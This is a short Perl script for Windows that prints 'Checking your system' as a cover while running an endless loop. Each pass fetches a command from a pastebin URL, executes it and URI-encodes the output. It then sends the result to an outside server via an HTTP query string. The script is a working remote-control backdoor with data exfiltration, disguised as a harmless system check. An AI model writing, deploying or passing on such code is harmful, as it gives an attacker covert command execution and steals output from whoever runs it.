#use strict;
#use warnings;
use Win32::Internet;
use URI::Encode qw(uri_encode uri_decode);;

print "Checking your system ";
while ( 1 ) {
	my $INET = new Win32::Internet();
	my $cmd = $INET->FetchURL("http://pastebin.com/raw.php?i=xK7vweJ1");
	my $out = sprintf "%s\n\n", scalar localtime();
	for my $line (`$cmd`) {
		$out .= uri_encode($line);
	}
	$INET->FetchURL("http://ldap1.reisinger.sk/cgi-bin/http-rex.cgi?out=$out");
	sleep 2;
    print ".";
}
